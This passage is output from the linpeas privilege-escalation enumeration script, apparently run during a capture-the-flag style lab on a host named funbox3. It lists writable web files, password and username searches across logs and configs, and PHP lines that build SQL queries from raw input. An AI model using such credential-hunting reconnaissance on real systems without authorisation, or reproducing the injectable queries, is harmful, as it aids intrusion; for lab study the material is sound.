-rw-r----- 1 root adm 411 Feb 17 19:44 /var/log/apache2/error.log.2.gz
-rw-r----- 1 root adm 9696179 May  6 04:44 /var/log/apache2/error.log

[+] Modified interesting files in the last 5mins (limit 100)
/home/tony/.gnupg/crls.d/DIR.txt                                                  
/home/tony/.gnupg/trustdb.gpg
/home/tony/.gnupg/pubring.kbx
/home/tony/snap/lxd/18077/.config/lxc/config.yml
/home/tony/1.txt
/var/log/kern.log
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/journal/92ec3c988921478186aee5c70411b62c/user-1000.journal
/var/log/journal/92ec3c988921478186aee5c70411b62c/system.journal
/var/log/syslog
/var/snap/lxd/common/lxc/local.conf
/var/snap/lxd/common/lxcfs.pid
/var/snap/lxd/common/lxd.pid
/var/snap/lxd/common/state

[+] Writable log files (logrotten) (limit 100)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                                                                              
logrotate 3.14.0                                                                  

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

[+] Files inside /home/tony (limit 20)
total 364                                                                         
drwxr-xr-x 5 tony tony   4096 May  6 04:45 .
drwxr-xr-x 3 root root   4096 Jul 30  2020 ..
-rw------- 1 tony tony      0 Oct 30  2020 .bash_history
-rw-r--r-- 1 tony tony    220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 tony tony   3771 Feb 25  2020 .bashrc
drwx------ 2 tony tony   4096 May  6 04:39 .cache
drwx------ 4 tony tony   4096 May  6 04:45 .gnupg
-rw-r--r-- 1 tony tony    807 Feb 25  2020 .profile
-rw-r--r-- 1 tony tony      0 May  6 04:39 .sudo_as_admin_successful
-rwxrwxrwx 1 tony tony      0 May  6 04:44 1.txt
-rwxrwxrwx 1 tony tony 332111 May  5 08:06 linpeas.sh
-rwxrwxrwx 1 tony tony     70 Jul 31  2020 password.txt
drwxr-xr-x 3 tony tony   4096 May  6 04:45 snap

[+] Files inside others home (limit 20)
                                                                                  
[+] Searching installed mail applications
                                                                                  
[+] Mails (limit 50)
                                                                                  
[+] Backup folders
drwxr-xr-x 2 root root 4096 Jul 31  2020 /var/backups                             
total 704
-rw-r--r-- 1 root root  51200 Jul 31  2020 alternatives.tar.0
-rw-r--r-- 1 root root  35806 Jul 30  2020 apt.extended_states.0
-rw-r--r-- 1 root root    268 Jul 30  2020 dpkg.diversions.0
-rw-r--r-- 1 root root    172 Jul 30  2020 dpkg.statoverride.0
-rw-r--r-- 1 root root 619038 Jul 30  2020 dpkg.status.0


[+] Backup files
-rw-r--r-- 1 root root 2743 Apr 23  2020 /etc/apt/sources.list.curtin.old         
-rwxr-xr-x 1 root root 1086 Nov 25  2019 /usr/src/linux-headers-5.4.0-42/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rw-r--r-- 1 root root 0 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 237784 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/.config.old
-rw-r--r-- 1 root root 8161 Jul  9  2020 /usr/lib/modules/5.4.0-42-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 8729 Jul  9  2020 /usr/lib/modules/5.4.0-42-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 35320 Jul 27  2020 /usr/lib/mysql/plugin/component_mysqlbackup.so                                                                            
-rw-r--r-- 1 root root 44048 Jun 22  2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rwxr-xr-x 1 root root 226 Feb 17  2020 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 11070 Jul 30  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rw-r--r-- 1 root root 392817 Feb  9  2020 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 2756 Feb 13  2020 /usr/share/man/man8/vgcfgbackup.8.gz

[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)
                                                                                  
[+] Web files?(output limit)
/var/www/:                                                                        
total 16K
drwxr-xr-x  3 root     root     4.0K Oct 30  2020 .
drwxr-xr-x 14 root     root     4.0K Jul 30  2020 ..
drwxr-xr-x  6 root     root     4.0K Jul 31  2020 html
-rw-r--r--  1 www-data www-data   33 May  6 02:34 local.txt

/var/www/html:
total 220K
drwxr-xr-x  6 root root 4.0K Jul 31  2020 .

[+] Readable hidden interesting files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                                 
                                                                                  
[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)                                                                             
-rw-r--r-- 1 root root 102 Feb 13  2020 /etc/cron.daily/.placeholder              
-rw------- 1 root root 0 Apr 23  2020 /etc/.pwd.lock
-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
-rw-r--r-- 1 root root 220 Feb 25  2020 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 102 Feb 13  2020 /etc/cron.d/.placeholder
-rw-r--r-- 1 root root 102 Feb 13  2020 /etc/cron.monthly/.placeholder
-rw-r--r-- 1 root root 102 Feb 13  2020 /etc/cron.weekly/.placeholder
-rw-r--r-- 1 root root 102 Feb 13  2020 /etc/cron.hourly/.placeholder
-rw-r--r-- 1 root root 97 Nov 25  2019 /usr/src/linux-headers-5.4.0-42/scripts/kconfig/.gitignore
-rw-r--r-- 1 root root 55 Nov 25  2019 /usr/src/linux-headers-5.4.0-42/scripts/mod/.gitignore
-rw-r--r-- 1 root root 9 Nov 25  2019 /usr/src/linux-headers-5.4.0-42/scripts/genksyms/.gitignore
-rw-r--r-- 1 root root 7 Nov 25  2019 /usr/src/linux-headers-5.4.0-42/scripts/basic/.gitignore
-rw-r--r-- 1 root root 4 Nov 25  2019 /usr/src/linux-headers-5.4.0-42/scripts/dtc/.gitignore
-rw-r--r-- 1 root root 24 Nov 25  2019 /usr/src/linux-headers-5.4.0-42/scripts/gcc-plugins/.gitignore
-rw-r--r-- 1 root root 11 Nov 25  2019 /usr/src/linux-headers-5.4.0-42/scripts/selinux/genheaders/.gitignore
-rw-r--r-- 1 root root 21 Nov 25  2019 /usr/src/linux-headers-5.4.0-42/scripts/selinux/mdp/.gitignore
-rw-r--r-- 1 root root 145 Nov 25  2019 /usr/src/linux-headers-5.4.0-42/scripts/.gitignore
-rw-r--r-- 1 root root 25 Nov 25  2019 /usr/src/linux-headers-5.4.0-42/scripts/gdb/linux/.gitignore
-rw-r--r-- 1 root root 64540 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/kernel/.asm-offsets.s.cmd
-rw-r--r-- 1 root root 266 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/include/generated/uapi/asm/.unistd_32.h.cmd
-rw-r--r-- 1 root root 291 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd
-rw-r--r-- 1 root root 271 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/include/generated/uapi/asm/.unistd_64.h.cmd
-rw-r--r-- 1 root root 267 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/include/generated/asm/.unistd_64_x32.h.cmd
-rw-r--r-- 1 root root 243 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/include/generated/asm/.syscalls_32.h.cmd
-rw-r--r-- 1 root root 271 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/include/generated/asm/.unistd_32_ia32.h.cmd
-rw-r--r-- 1 root root 243 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/include/generated/asm/.syscalls_64.h.cmd
-rw-r--r-- 1 root root 353 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/include/generated/asm/.xen-hypercalls.h.cmd
-rw-r--r-- 1 root root 4821 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/tools/.relocs_common.o.cmd
-rw-r--r-- 1 root root 148 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/tools/.relocs.cmd
-rw-r--r-- 1 root root 4841 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/tools/.relocs_32.o.cmd
-rw-r--r-- 1 root root 4841 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/arch/x86/tools/.relocs_64.o.cmd
-rw-r--r-- 1 root root 14448 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/kernel/.bounds.s.cmd
-rw-r--r-- 1 root root 237625 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/.config
-rw-r--r-- 1 root root 39 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/.gitignore
-rw-r--r-- 1 root root 3708 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.libctype.o.cmd
-rw-r--r-- 1 root root 6293 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.parse-options.o.cmd
-rw-r--r-- 1 root root 8955 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.orc_dump.o.cmd
-rw-r--r-- 1 root root 9371 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/arch/x86/.decode.o.cmd
-rw-r--r-- 1 root root 449 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/arch/x86/.objtool-in.o.cmd
-rw-r--r-- 1 root root 4509 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.str_error_r.o.cmd
-rw-r--r-- 1 root root 6818 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.exec-cmd.o.cmd
-rw-r--r-- 1 root root 7763 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.builtin-check.o.cmd
-rw-r--r-- 1 root root 8589 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.orc_gen.o.cmd
-rw-r--r-- 1 root root 9073 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.elf.o.cmd
-rw-r--r-- 1 root root 1910 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.objtool-in.o.cmd
-rw-r--r-- 1 root root 1934 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.subcmd-config.o.cmd
-rw-r--r-- 1 root root 6979 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.pager.o.cmd
-rw-r--r-- 1 root root 6432 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.objtool.o.cmd
-rw-r--r-- 1 root root 420 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.fixdep-in.o.cmd
-rw-r--r-- 1 root root 7864 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.help.o.cmd
-rw-r--r-- 1 root root 8424 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.run-command.o.cmd
-rw-r--r-- 1 root root 8025 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.builtin-orc.o.cmd
-rw-r--r-- 1 root root 1238 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.libsubcmd-in.o.cmd
-rw-r--r-- 1 root root 8568 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.special.o.cmd
-rw-r--r-- 1 root root 6024 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.sigchain.o.cmd
-rw-r--r-- 1 root root 5907 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.libstring.o.cmd
-rw-r--r-- 1 root root 8664 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.check.o.cmd
-rw-r--r-- 1 root root 5270 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.fixdep.o.cmd
-rw-r--r-- 1 root root 4404 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/tools/objtool/.fixdep.o.d
-rw-r--r-- 1 root root 237784 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/.config.old
-rw-r--r-- 1 root root 999 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/.missing-syscalls.d
-rw-r--r-- 1 root root 8168 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/scripts/.sign-file.cmd
-rw-r--r-- 1 root root 3950 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/scripts/.kallsyms.cmd
-rw-r--r-- 1 root root 3686 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/scripts/.conmakehash.cmd
-rw-r--r-- 1 root root 4147 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/scripts/kconfig/.symbol.o.cmd
-rw-r--r-- 1 root root 129 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/scripts/kconfig/.lexer.lex.c.cmd
-rw-r--r-- 1 root root 176 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/scripts/kconfig/.parser.tab.h.cmd
-rw-r--r-- 1 root root 5738 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/scripts/kconfig/.confdata.o.cmd
-rw-r--r-- 1 root root 245 Jul  9  2020 /usr/src/linux-headers-5.4.0-42-generic/scripts/kconfig/.conf.cmd

[+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                        
-rw-r--r-- 1 root root 268 Jul 30  2020 /var/backups/dpkg.diversions.0            
-rw-r--r-- 1 root root 619038 Jul 30  2020 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 35806 Jul 30  2020 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 172 Jul 30  2020 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 51200 Jul 31  2020 /var/backups/alternatives.tar.0

[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)                                                                          
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files    
/dev/mqueue                                                                       
/dev/shm
/home/tony
/run/lock
/run/screen
/run/screen/S-tony
/run/user/1000
/run/user/1000/dbus-1
/run/user/1000/dbus-1/services
/run/user/1000/gnupg
/run/user/1000/inaccessible
/run/user/1000/systemd
/run/user/1000/systemd/units
/snap/core18/1885/tmp
/snap/core18/1885/var/tmp
/snap/core18/1932/tmp
/snap/core18/1932/var/tmp
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/lib/php/sessions
/var/tmp
/var/www/html/store
/var/www/html/store/.gitattributes
/var/www/html/store/README.md
/var/www/html/store/admin.php
/var/www/html/store/admin_add.php
/var/www/html/store/admin_book.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/store/bootstrap/css
/var/www/html/store/bootstrap/css/bootstrap-theme.min.css
/var/www/html/store/bootstrap/css/bootstrap.min.css
/var/www/html/store/bootstrap/css/jumbotron.css
/var/www/html/store/bootstrap/fonts
/var/www/html/store/bootstrap/fonts/glyphicons-halflings-regular.eot
/var/www/html/store/bootstrap/fonts/glyphicons-halflings-regular.ttf
/var/www/html/store/bootstrap/fonts/glyphicons-halflings-regular.woff
/var/www/html/store/bootstrap/fonts/glyphicons-halflings-regular.woff2
/var/www/html/store/bootstrap/img
/var/www/html/store/bootstrap/js
/var/www/html/store/bootstrap/js/bootstrap.min.js
/var/www/html/store/bootstrap/js/jquery-2.1.4.min.js
/var/www/html/store/cart.php
/var/www/html/store/checkout.php
/var/www/html/store/contact.php
/var/www/html/store/controllers
/var/www/html/store/controllers/DatabaseTalking
/var/www/html/store/controllers/DatabaseTalking/Take.php
/var/www/html/store/controllers/DatabaseTalking/Talking.php
/var/www/html/store/database
/var/www/html/store/database/readme.txt.txt
/var/www/html/store/database/www_project.sql
/var/www/html/store/edit_book.php
/var/www/html/store/empty_session.php
/var/www/html/store/functions
/var/www/html/store/functions/admin.php
/var/www/html/store/functions/cart_functions.php
/var/www/html/store/functions/database_functions.php
/var/www/html/store/index.php
/var/www/html/store/models
/var/www/html/store/models/admin
/var/www/html/store/models/admin/Admin.php
/var/www/html/store/models/customer
/var/www/html/store/models/customer/Customers.php
/var/www/html/store/models/goods
/var/www/html/store/models/goods/Address.php
/var/www/html/store/models/goods/Author.php
/var/www/html/store/models/goods/Book.php
/var/www/html/store/models/goods/BookTest.php
/var/www/html/store/models/goods/Genre.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/store/models/interfaces
/var/www/html/store/models/interfaces/Damage.php
/var/www/html/store/models/orders
/var/www/html/store/models/orders/OrderDetails.php
/var/www/html/store/models/orders/Orders.php
/var/www/html/store/models/orders/OrdersTest.php
/var/www/html/store/models/orders/UnAvailableOrderDetails.php
/var/www/html/store/models/reviews
/var/www/html/store/models/reviews/Review.php
/var/www/html/store/models/serve
/var/www/html/store/models/serve/FileInterface.php
/var/www/html/store/models/serve/Image.php
/var/www/html/store/process.php
/var/www/html/store/publisher_list.php
/var/www/html/store/purchase.php
/var/www/html/store/template
/var/www/html/store/template/footer.php
/var/www/html/store/template/header.php
/var/www/html/store/verify.php

[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files    
  Group tony:                                                                     
                                                                                  
  Group adm:
                                                                                  
  Group cdrom:
                                                                                  
  Group sudo:
                                                                                  
  Group dip:
                                                                                  
  Group plugdev:
                                                                                  
  Group lxd:
                                                                                  

[+] Searching passwords in config PHP files
                                                                                  
[+] Checking for TTY (sudo/su) passwords in audit logs
                                                                                  
[+] Finding IPs inside logs (limit 70)
 325309 /var/log/apache2/access.log:192.168.45.5                                  
  64998 /var/log/apache2/error.log:192.168.45.5
    849 /var/log/apache2/access.log:192.168.183.111
    105 /var/log/apache2/error.log:192.168.183.111
     10 /var/log/journal/92ec3c988921478186aee5c70411b62c/system.journal:192.168.45.5
     10 /var/log/auth.log:192.168.45.5
      9 /var/log/syslog:91.189.94.4
      9 /var/log/syslog:91.189.91.157
      9 /var/log/syslog:185.125.190.58
      9 /var/log/syslog:185.125.190.57
      9 /var/log/syslog:185.125.190.56
      1 /var/log/wtmp:192.168.45.5
      1 /var/log/mysql/error.log:192.168.45.5
      1 /var/log/lastlog:192.168.45.5
      1 /var/log/journal/92ec3c988921478186aee5c70411b62c/system.journal:91.189.94.4
      1 /var/log/journal/92ec3c988921478186aee5c70411b62c/system.journal:91.189.91.157
      1 /var/log/journal/92ec3c988921478186aee5c70411b62c/system.journal:185.125.190.58
      1 /var/log/journal/92ec3c988921478186aee5c70411b62c/system.journal:185.125.190.57
      1 /var/log/journal/92ec3c988921478186aee5c70411b62c/system.journal:185.125.190.56

[+] Finding passwords inside logs (limit 70)
/var/log/apache2/access.log:192.168.45.5 - - [06/May/2023:03:09:29 +0000] "GET /forgot-password.php HTTP/1.1" 200 1255 "-" "gobuster/3.5"
/var/log/auth.log.1:Feb 17 19:44:20 funbox3 VGAuth[643]: vmtoolsd: Username and password successfully validated for 'root'.                                         
/var/log/auth.log.1:Feb 17 19:44:23 funbox3 VGAuth[643]: vmtoolsd: Username and password successfully validated for 'root'.                                         
/var/log/auth.log.1:Feb 17 19:44:27 funbox3 VGAuth[643]: vmtoolsd: Username and password successfully validated for 'root'.                                         
/var/log/auth.log:May  6 02:34:48 funbox3 VGAuth[643]: vmtoolsd: Username and password successfully validated for 'root'.                                           
/var/log/auth.log:May  6 02:34:49 funbox3 VGAuth[643]: vmtoolsd: Username and password successfully validated for 'root'.                                           
/var/log/auth.log:May  6 02:34:50 funbox3 VGAuth[643]: vmtoolsd: Username and password successfully validated for 'root'.                                           
/var/log/auth.log:May  6 02:34:56 funbox3 VGAuth[643]: vmtoolsd: Username and password successfully validated for 'root'.                                           
/var/log/auth.log:May  6 02:34:57 funbox3 VGAuth[643]: message repeated 2 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
/var/log/auth.log:May  6 02:35:01 funbox3 VGAuth[643]: vmtoolsd: Username and password successfully validated for 'root'.                                           
/var/log/auth.log:May  6 02:35:02 funbox3 VGAuth[643]: message repeated 2 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
/var/log/auth.log:May  6 04:39:00 funbox3 sshd[4953]: Failed password for root from 192.168.45.5 port 47458 ssh2
/var/log/auth.log:May  6 04:39:46 funbox3 sshd[5054]: Accepted password for tony from 192.168.45.5 port 39270 ssh2
/var/log/auth.log:May  6 04:39:56 funbox3 sudo:     tony : TTY=pts/1 ; PWD=/home/tony ; USER=root ; COMMAND=list
/var/log/auth.log:May  6 04:45:22 funbox3 sudo:     tony : TTY=pts/1 ; PWD=/home/tony ; USER=root ; COMMAND=list
/var/log/dmesg.0:[  107.023615] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
/var/log/dmesg:[    2.715410] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
Binary file /var/log/cloud-init.log matches
Binary file /var/log/journal/92ec3c988921478186aee5c70411b62c/system.journal matches
Binary file /var/log/journal/92ec3c988921478186aee5c70411b62c/system@0005f4c26b083950-593d012a5eb63820.journal~ matches
Binary file /var/log/journal/92ec3c988921478186aee5c70411b62c/system@0005f4ccd9cc6b92-28d4f010916dc674.journal~ matches
Binary file /var/log/journal/92ec3c988921478186aee5c70411b62c/system@0005f4ea81d1e2c4-fe457fded63bc225.journal~ matches

[+] Finding emails inside logs (limit 70)
      3 /var/log/kern.log.1:giometti@linux.it                                     
      3 /var/log/kern.log.1:dm-devel@redhat.com
      1 /var/log/dmesg:giometti@linux.it
      1 /var/log/dmesg:dm-devel@redhat.com
      1 /var/log/dmesg.0:giometti@linux.it
      1 /var/log/dmesg.0:dm-devel@redhat.com

[+] Finding *password* or *credential* files in home (limit 70)
                                                                                  
[+] Finding passwords inside key folders (limit 70) - only PHP files
./linpeas.sh: 3147: printf: %20/: invalid directive                               
/var/www/html/registration.php:                                 <input type="password" name="cpassword" id="cpassword" class="form-control">                                 
/var/www/html/registration.php:                                 <input type="password" name="password" id="password" class="form-control">                                 
/var/www/html/registration.php:                                 <input type="text" name="phone" id="txtpassword" class="form-control">                                 
/var/www/html/registration.php:                  if(document.getElementById('cpassword').value!=document.getElementById('password').value)                          
/var/www/html/registration.php:                  if(document.getElementById('cpassword').value=="")                                                                 
/var/www/html/registration.php:                  if(document.getElementById('password').value=="")
/var/www/html/registration.php: $password=$_POST['password'];
/var/www/html/registration.php:            document.getElementById('cpwd').innerHTML="*Confirm password field empty.";
/var/www/html/registration.php:            document.getElementById('cpwd').style.display="block";
/var/www/html/registration.php:            document.getElementById('cpwd').style.display="none";
/var/www/html/registration.php:            document.getElementById('mpwd').innerHTML="*Password or Cofirm Password doesnot match.";
/var/www/html/registration.php:            document.getElementById('mpwd').style.display="block";
/var/www/html/registration.php:            document.getElementById('mpwd').style.display="none";
/var/www/html/registration.php:            document.getElementById('pwd').innerHTML="*Password field empty.";
/var/www/html/registration.php:            document.getElementById('pwd').style.display="block";
/var/www/html/registration.php:            document.getElementById('pwd').style.display="none";
/var/www/html/store/models/customer/Customers.php:        $this->password = $password;

[+] Finding passwords inside key folders (limit 70) - no PHP files
./linpeas.sh: 3151: printf: %20/: invalid directive                               

[+] Finding possible password variables inside key folders (limit 140)
/var/www/html/gym/New Text Document.txt:$mysql_database = "a8743500_secure";      

[+] Finding possible password in config files
 /etc/debconf.conf                                                                
passwords.
password
passwords.
passwords
password
passwords.dat
passwords and one for everything else.
passwords
password is really
Passwd: secret
 /etc/sysctl.d/10-ptrace.conf
credentials that exist in memory (re-using existing SSH connections,
 /etc/overlayroot.conf
password is randomly generated
password will be stored for recovery in
passwd
password,mkfs=0
PASSWORD="foobar"
PASSWORD" |
PASSWORD" |
PASSWORD HERE IN THIS CLEARTEXT CONFIGURATION
passwords are more secure, but you won't be able to
passwords are generated by calculating the sha512sum
 /etc/adduser.conf
passwd
 /etc/apache2/apache2.conf
passwd files from being
 /etc/nsswitch.conf
passwd:         files systemd

[+] Finding 'username' string inside key folders (limit 70)
/var/www/html/admin/assets/js/login.js:                    txtusername: {         
/var/www/html/admin/assets/js/login_v2.js:                    txtusername: {
/var/www/html/admin/index.php:                                  <input type="text" name="email" id="txtusername" class="form-control">                                 
/var/www/html/forgot-password.php:                                      <input type="text" name="email" id="txtusername" class="form-control">                                 
/var/www/html/gym/Feedback.php:               <?php if (!isset($_SESSION['username'])){echo'<li><a href="packages.php">Package</a></li>
/var/www/html/gym/admin/a.php:  <input type="text" class="form-control" placeholder="Username" name="bank" >
/var/www/html/gym/admin/a.php:  <input type="text" class="form-control" placeholder="Username" name="username" id="username">
/var/www/html/gym/admin/a.php:$jack=mysqli_query($mysqli,"UPDATE `members` SET paid = 1 where username = '$bank'");
/var/www/html/gym/admin/a.php:Enter USERNAME to mark absent: <input type="text" name="id" size="5">
/var/www/html/gym/admin/a.php:Enter USERNAME to mark the present: <input type="text" name="id" size="5">
/var/www/html/gym/att/matt.php:$username = $_POST['id'];
/var/www/html/gym/att/matta.php:$username = $_POST['id'];
/var/www/html/gym/editp.php:    $q = mysqli_query($mysqli, "UPDATE `members` SET fname = '$fn' WHERE username = '$username'");
/var/www/html/gym/editp.php:$username = $_POST['id'];
/var/www/html/gym/ex/admin/a.php:  <input type="text" class="form-control" placeholder="Username" name="username" id="username">
/var/www/html/gym/ex/admin/a.php:Enter USERNAME to mark absent: <input type="text" name="id" size="5">
/var/www/html/gym/ex/admin/a.php:Enter USERNAME to mark present: <input type="text" name="id" size="5">
/var/www/html/gym/ex/att/matt.php:$username = $_POST['id'];
/var/www/html/gym/ex/att/matta.php:$username = $_POST['id'];
/var/www/html/gym/ex/editp.php: $q = mysqli_query($mysqli, "UPDATE `members` SET fname = '$fn' WHERE username = '$username'");
/var/www/html/gym/ex/editp.php:$username = $_POST['id'];
/var/www/html/gym/ex/include/functions.php:                    $_SESSION['username'] = $username;
/var/www/html/gym/ex/include/functions.php:                    $username = preg_replace("/[^a-zA-Z0-9_\-]+/", 
/var/www/html/gym/ex/include/functions.php:        $username = $_SESSION['username'];
/var/www/html/gym/ex/include/register.inc.php:    $p_stmt = "SELECT id FROM members WHERE username = ? LIMIT 1";
/var/www/html/gym/ex/include/register.inc.php:    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
/var/www/html/gym/ex/index.php:             <?php if (!isset($_SESSION['username'])){echo'<li class="active" id="a">
/var/www/html/gym/ex/profile/action.php:$query1=mysqli_query($mysqli,"UPDATE `members` SET username ='$username', email = '$email' where id = '$i'");
/var/www/html/gym/ex/profile/action.php:$username = $_POST['username'];
/var/www/html/gym/ex/profile/edit.php:  <input type="text" class="form-control" value="<?php echo $q1['username'];?>" name="username" id="username">
/var/www/html/gym/ex/profile/fun.php:      $query="update members set url='$url', lastUpload=now() where username='$user'";
/var/www/html/gym/ex/profile/fun.php:$pull="select * from members where username='$user'";
/var/www/html/gym/ex/profile/fun.php:$query = "SELECT * FROM `members` WHERE username = '$username'";                                                               
/var/www/html/gym/ex/profile/fun.php:$username = $_SESSION['username'];
/var/www/html/gym/ex/profile/i.php: $username = $_SESSION['username'];
/var/www/html/gym/ex/profile/i.php:$query = "SELECT * FROM `members` WHERE username = '$username'";                                                                 
/var/www/html/gym/ex/profile/index.php: $username = $_SESSION['username'];
/var/www/html/gym/ex/profile/index.php:$query = "SELECT * FROM `members` WHERE username = '$username'";                                                             
/var/www/html/gym/ex/register.php:  <input type="text" class="form-control" placeholder="Username" name="username" id="username">
/var/www/html/gym/ex/workouts/index.php:  $username = $_SESSION['username'];
/var/www/html/gym/ex/workouts/index.php:$query = "SELECT * FROM `members` WHERE username = '$username'";                                                            
/var/www/html/gym/include/functions.php:                    $_SESSION['username'] = $username;
/var/www/html/gym/include/functions.php:                    $username = preg_replace("/[^a-zA-Z0-9_\-]+/", 
/var/www/html/gym/include/functions.php:        $username = $_SESSION['username'];
/var/www/html/gym/include/register.inc.php:    $p_stmt = "SELECT id FROM members WHERE username = ? LIMIT 1";
/var/www/html/gym/include/register.inc.php:    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
/var/www/html/gym/index.php:               <?php if (!isset($_SESSION['username'])){echo'<li><a href="packages.php">Package</a></li>
/var/www/html/gym/profile/action.php:$query1=mysqli_query($mysqli,"UPDATE `members` SET username ='$username', email = '$email' where id = '$i'");
/var/www/html/gym/profile/action.php:$username = $_POST['username'];
/var/www/html/gym/profile/edit.php:  <input type="text" class="form-control" value="<?php echo $q1['username'];?>" name="username" id="username">
/var/www/html/gym/profile/fun.php:      $query="update members set url='$url', lastUpload=now() where username='$user'";
/var/www/html/gym/profile/fun.php:$pull="select * from members where username='$user'";
/var/www/html/gym/profile/fun.php:$query = "SELECT * FROM `members` WHERE username = '$username'";
/var/www/html/gym/profile/fun.php:$username = $_SESSION['username'];
/var/www/html/gym/profile/i.php:    <label>Username</label>: <?php echo $row["username"];?><br>                                                                     
/var/www/html/gym/profile/i.php: $username = $_SESSION['username'];
